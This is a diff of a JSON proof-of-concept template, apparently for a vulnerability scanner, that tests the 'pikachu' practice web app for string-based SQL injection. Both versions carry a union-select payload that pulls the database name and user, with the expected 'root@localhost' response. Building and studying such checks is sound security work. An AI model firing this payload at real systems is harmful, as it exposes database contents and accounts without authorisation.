@@ -1,17 +1,26 @@
 {
-  "request": {
-    "host": "192.168.207.128",
-    "method": "get",
-    "url": "http://192.168.207.128/vul/sqli/sqli_str.php?name=111&submit=查询",
-    "cookie": "",
-    "requestheader": "",
-    "requestbody": "x' union select database(),user()#"
-  },
-  "response": {
-    "statuscode": 200,
-    "statusmessage": "[+] 存在字符型sql注入",
-    "responsetime": "",
-    "responseheader": "",
-    "responsebody": "<p class='notice'>your uid:pikachu <br />your email is: root@localhost</p>"
-  }
+    "name": "pikachu",
+    "vuln": "字符型sql注入",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/sqli/sqli_str.php?name=x%27+union+select+database%28%29%2Cuser%28%29%23&submit=查询",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "[+] 存在字符型sql注入",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "root@localhost"
+            }
+        }
+    }
 }
